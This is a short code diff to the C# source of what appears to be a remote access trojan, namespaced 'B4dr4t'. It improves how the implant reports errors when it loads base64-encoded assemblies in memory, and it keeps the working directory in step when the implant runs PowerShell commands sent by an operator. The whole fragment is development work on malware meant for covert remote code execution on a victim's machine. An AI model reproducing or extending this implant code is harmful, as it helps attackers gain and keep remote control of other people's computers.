@@ -60,9 +60,9 @@ namespace B4dr4t
                 byte[] data = Convert.FromBase64String(encodedAssembly);
                 assembly = Assembly.Load(data);
             }
-            catch
+            catch (Exception e)
             {
-                return "[!] Could not load assembly.";
+                return "[!] Could not load assembly. Error caught:\n" + e.ToString();
             }
 
             // Get all types in the assembly
@@ -230,6 +230,19 @@ namespace B4dr4t
                         }
                         else // Execute (Power)shell command
                         {
+                            if(cmnd.StartsWith("cd "))
+                            {
+                                // Change directories in C# when we CD in shell to keep C# and PS pwd the same
+                                try
+                                {
+                                    var directory = string.Join(" ", cmnd.Split(' ').Skip(1).Take(cmnd.Length).ToArray());
+                                    Directory.SetCurrentDirectory(directory);
+                                }
+                                catch
+                                {
+                                    //pass
+                                }
+                            }
                             output = ps.AddScript(cmnd).Invoke();
                             foreach (PSObject item in output)
                             {
